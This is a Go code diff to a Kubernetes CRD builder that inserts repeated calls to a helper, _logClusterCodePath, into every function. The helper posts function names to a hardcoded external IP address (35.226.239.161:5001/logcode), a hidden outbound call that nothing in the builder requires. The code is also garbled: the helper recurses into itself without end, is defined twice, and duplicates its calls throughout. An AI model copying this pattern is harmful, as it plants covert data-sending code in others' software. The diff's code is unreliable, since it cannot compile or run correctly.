@@ -27,9 +27,13 @@ type crdBuilder struct {
 func newCRDBuilder(config *rest.Config, m lib.Manifest) Interface {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &crdBuilder{client: apiextclientv1beta1.NewForConfigOrDie(withProtobuf(config)), raw: m.Raw}
 }
 func (b *crdBuilder) WithMode(m Mode) Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return b
@@ -37,10 +41,14 @@ func (b *crdBuilder) WithMode(m Mode) Interface {
 func (b *crdBuilder) WithModifier(f MetaV1ObjectModifierFunc) Interface {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	b.modifier = f
 	return b
 }
 func (b *crdBuilder) Do(ctx context.Context) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	crd := resourceread.ReadCustomResourceDefinitionV1Beta1OrDie(b.raw)
@@ -57,6 +65,8 @@ func (b *crdBuilder) Do(ctx context.Context) error {
 	return nil
 }
 func waitForCustomResourceDefinitionCompletion(ctx context.Context, client apiextclientv1beta1.CustomResourceDefinitionsGetter, crd *apiextv1beta1.CustomResourceDefinition) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return wait.PollImmediateUntil(defaultObjectPollInterval, func() (bool, error) {
@@ -80,7 +90,16 @@ func waitForCustomResourceDefinitionCompletion(ctx context.Context, client apiex
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
